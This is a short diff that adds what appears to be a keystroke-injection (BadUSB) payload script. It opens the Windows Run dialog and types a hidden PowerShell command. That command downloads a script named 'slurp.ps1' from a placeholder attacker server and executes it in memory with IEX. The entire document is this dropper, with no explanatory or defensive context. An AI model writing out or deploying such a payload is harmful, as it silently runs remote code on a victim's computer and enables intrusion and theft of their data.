@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle hidden IEX (New-Object Net.WebClient).DownloadString('https://<votre serveur>/slurp.ps1')
+ENTER
